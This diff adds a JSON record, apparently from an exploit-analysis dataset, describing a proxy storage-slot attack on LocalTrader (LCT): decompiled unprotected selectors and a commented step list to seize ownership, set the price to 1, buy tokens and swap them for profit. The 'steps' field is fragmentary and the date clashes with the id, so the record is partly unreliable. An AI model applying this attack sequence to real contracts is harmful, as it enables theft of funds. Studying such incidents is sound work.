@@ -1,0 +1,29 @@
+{
+ "id": "2023__2023-05-xx_LocalTrader_ProxyStorageSlotManipulation",
+ "source_file": "2023/2023-05-xx_LocalTrader_ProxyStorageSlotManipulation.md",
+ "title": "LocalTrader (LCT) Exploit — Proxy Storage Slot Manipulation via Unprotected Selectors",
+ "date": "2023-01-01",
+ "protocol": "LocalTrader",
+ "chain": null,
+ "loss_raw": null,
+ "loss_usd": null,
+ "root_cause": null,
+ "attack_tx": null,
+ "vulnerable_contract": null,
+ "classes": [
+  "proxy-storage"
+ ],
+ "code_before": [
+  "// File: LocalTrader_decompiled.sol\ncontract LocalTrader {  // ❌\n\n    // ❌ Proxy storage slot collision risk\n    // Selector: 0x3659cfe6\n    function upgradeTo(address account) external {}  // ❌\n\n    // ❌ Proxy storage slot collision risk\n    // Selector: 0x4f1ef286\n    function upgradeToAndCall(address account, bytes data) external {}  // ❌\n\n    // ❌ Proxy storage slot collision risk\n    // Selector: 0x5c60da1b\n    function implementation() external view returns (address) {}  // ❌\n\n    // Selector: 0x8f283970\n    function changeAdmin(address account) external {}  // ❌\n\n    // Selector: 0xf851a440\n    function admin() external {}\n\n}\n\n// ...\n\n    function upgradeTo(address account) external {}  // ❌\n\n// ...\n\n    function upgradeToAndCall(address account, bytes data) external {}  // ❌\n\n// ...\n\n    function implementation() external view returns (address) {}  // ❌\n\n// ...\n\n    function changeAdmin(address account) external {}  // ❌"
+ ],
+ "code_after": [],
+ "steps": [
+  "// → buys LCT at price=1, receives huge amount of LCT",
+  "// LCT, 0, [LCT→WBNB], address(this), deadline",
+  "// ) // swap LCT → WBNB for profit"
+ ],
+ "other_code": [
+  "// 1. proxy.call(abi.encodeWithSelector(\n//       0xb5863c10,\n//       address(attacker)\n//    ))  // set owner to attacker (slot 0 write)\n// 2. proxy.call(abi.encodeWithSelector(\n//       0x925d400c,\n//       uint256(1)\n//    ))  // set token price to 1 (slot 3 write)\n// 3. LCTExchange.buyTokens{value: BNB}()\n//    → buys LCT at price=1, receives huge amount of LCT\n// 4. Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\n//       LCT, 0, [LCT→WBNB], address(this), deadline\n//    )  // swap LCT → WBNB for profit",
+  "interface ILCTExchange {\n    function buyTokens() external payable;\n}\n\ninterface IPancakeRouter {\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\n        uint256 amountIn, uint256 amountOutMin,\n        address[] calldata path, address to, uint256 deadline\n    ) external;\n}"
+ ]
+}
